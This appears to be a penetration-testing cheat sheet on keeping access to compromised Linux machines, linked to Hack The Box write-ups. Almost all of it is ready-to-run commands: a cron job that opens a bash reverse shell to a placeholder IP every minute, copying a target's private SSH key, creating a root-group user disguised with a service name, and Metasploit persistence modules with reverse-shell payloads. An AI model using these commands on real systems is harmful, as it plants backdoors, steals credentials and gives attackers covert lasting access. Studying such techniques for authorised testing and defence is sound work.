# Linux - Persistence

## Manual Persistence

### Cronjob persistence

```bash
# check cron configuration
cat /etc/cron*

# create revshell script file
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'" > cron_shell

# add script in crontab file
crontab -i cron_shell
# check the crontab configuration
crontab -l

# run netcat listener
nc -nvlp PORT
```

### Persistence Via SSH Keys

```bash
# search .ssh directory in the system
# hope that .ssh dir contain id_rsa file

# transfer files from a target system to our local system via SSH (shell in attack machine)
scp USER@IP:/.ssh/id_rsa .

# change rsa file permission (600)
chmod 600 id_rsa
# login via ssh with private key
ssh -i id_rsa USER@IP
```

#### HTB Machine example



[#percistance-with-ssh-root-connection](../../../../ctf/hack-the-box/linux-machines/write-up.md#percistance-with-ssh-root-connection "mention")

### Add new user

```bash
# When we are in the target with root user, 
# for establish the access we can create a new account 
# (to keep hide the new profile we can rename it like a service name ex. ftp, sshd)
useradd -m NEW_USER -s /bin/bash
passwd NEW_USER

# add the new user in the root group
usermod -aG root NEW_USER
```

## Automatic Persistence

```bash
# cronjob persistence module
use exploit/linux/local/cron_persistence
show options
set SESSION N
exploit
set LPORT PORT
set LHOST IP
exploit
```

```bash
# revshell persistence module
use exploit/linux/local/service_persistence
show options
set SESSION N
set payload cmd/unix/reverse_python
set LHOST IP
set LPORT PORT
exploit
```

```bash
# ssh persistence module
use post/linux/manage/sshkey_persistence
show options
set CREATESSHFOLDER true
set SESSION N
exploit

# copy content of rsa_file and use file for take access
cat RSA_FILE
exit
vim ssh_key
chmod 0400 ssh_key
ssh -i ssh_key root@$IP
```
